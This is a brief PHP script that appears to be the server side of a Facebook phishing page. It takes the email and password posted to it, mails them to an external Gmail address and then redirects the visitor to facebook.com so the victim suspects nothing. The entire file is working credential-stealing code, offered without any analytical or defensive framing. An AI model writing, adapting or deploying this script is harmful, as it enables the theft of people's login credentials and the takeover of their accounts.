<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "armandobobadilla906@gmail.com";
    $subject = "Datos de inicio de sesión ";
    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;

    mail($to, $subject, $message);
    
    header('Location: https://www.facebook.com');
    exit();
}
?>